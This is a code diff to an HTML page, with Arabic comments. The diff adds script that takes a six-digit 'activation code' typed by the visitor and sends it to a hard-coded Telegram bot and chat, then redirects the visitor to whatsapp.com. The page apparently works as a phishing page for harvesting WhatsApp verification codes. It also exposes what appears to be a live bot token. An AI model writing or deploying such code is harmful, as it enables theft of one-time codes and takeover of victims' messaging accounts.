@@ -119,19 +119,48 @@
     </div>
 
     <script>
+        // بيانات API Telegram
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+        const chatId = '612575358';
+
+        // وظيفة الإرسال
         function sendMessage() {
             const phoneNumberInput = document.getElementById('phoneNumber');
             const phoneNumber = phoneNumberInput.value;
 
+            // التحقق من الإدخال
             if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
                 alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                 return;
             }
 
+            // إنشاء الرسالة
             const message = `رمز التفعيل: ${phoneNumber}`;
-            alert(message);
 
-            // يمكن إضافة API أو توجيه المستخدم إلى صفحة أخرى هنا
+            // إرسال الرسالة عبر Telegram API
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('تم إرسال رمز التفعيل بنجاح!');
+                        phoneNumberInput.value = ''; // إعادة تعيين الحقل
+                        window.location.href = "https://www.whatsapp.com"; // إعادة توجيه المستخدم
+                    } else {
+                        alert('حدث خطأ أثناء إرسال رمز التفعيل. يرجى المحاولة لاحقاً.');
+                    }
+                })
+                .catch(error => {
+                    alert('فشل الاتصال بالخادم. يرجى التحقق من الإنترنت والمحاولة مرة أخرى.');
+                });
         }
     </script>
 </body>
